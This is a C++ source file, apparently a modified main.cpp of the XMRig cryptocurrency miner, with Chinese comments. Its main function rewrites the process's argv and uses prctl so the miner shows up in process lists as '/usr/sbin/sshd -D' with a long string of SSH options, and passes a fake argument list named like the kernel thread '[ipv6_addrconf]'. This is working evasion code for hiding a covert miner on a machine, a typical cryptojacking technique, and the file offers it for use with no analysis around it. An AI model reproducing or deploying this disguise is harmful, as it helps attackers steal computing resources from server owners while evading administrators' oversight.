/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2019 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#include <sys/prctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"

# define MAXLINE 2048

extern char **environ;

static char **g_main_Argv = NULL;    /* pointer to argument vector */
static char *g_main_LastArgv = NULL;    /* end of argv */

void setproctitle_init(int argc, char **argv, char **envp)
{
    int i;

    for (i = 0; envp[i] != NULL; i++) // calc envp num
        continue;
    environ = (char **) malloc(sizeof (char *) * (i + 1)); // malloc envp pointer

    for (i = 0; envp[i] != NULL; i++)
    {
        environ[i] = (char *)malloc(sizeof(char) * strlen(envp[i]));
        strcpy(environ[i], envp[i]);
    }
    environ[i] = NULL;

    g_main_Argv = argv;
    if (i > 0)
        g_main_LastArgv = envp[i - 1] + strlen(envp[i - 1]);
    else
        g_main_LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
}

void setproctitle(const char *fmt, ...)
{
    char *p;
    int i;
    char buf[MAXLINE];

    extern char **g_main_Argv;
    extern char *g_main_LastArgv;
    va_list ap;
    p = buf;

    va_start(ap, fmt);
    vsprintf(p, fmt, ap);
    va_end(ap);

    i = strlen(buf);

    if (i > g_main_LastArgv - g_main_Argv[0] - 2)
    {
        i = g_main_LastArgv - g_main_Argv[0] - 2;
        buf[i] = '\0';
    }
    //修改argv[0]
    (void) strcpy(g_main_Argv[0], buf);

    p = &g_main_Argv[0][i];
    while (p < g_main_LastArgv)
        *p++ = '\0';
    g_main_Argv[1] = NULL;
    
    //调用prctl
    prctl(PR_SET_NAME,buf);
}

int main(int argc, char **argv) {
//主函数内再调用工具函数篡改进程名
    char argv_buf[MAXLINE] = {0}; // save argv paramters
    int i;

    for( i = 1; i < argc; i++)
    {
        strcat(argv_buf, argv[i]);
        strcat(argv_buf, " ");
    }
    
    //修改argv[0]所指向的内存空间的内容
    setproctitle_init(argc, argv, environ);
    
    //调用prctl修改进程名
    setproctitle("%s", "/usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc -oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 -oGSSAPIKexAlgorithms=gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oPubkeyAcceptedKeyTypes=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oCASignatureAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa");

    for (i = 0; environ[i] != NULL; i++)
        free(environ[i]);
	int argcc=3;
	char *new_name = "/usr/sbin/sshd -D";
	prctl(PR_SET_NAME, new_name);
	char *argvv[]={"[ipv6_addrconf]","-o","abcdefg"};	
	using namespace xmrig;

    //Process process(argc, argv);
	Process process(argcc, argvv);
    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
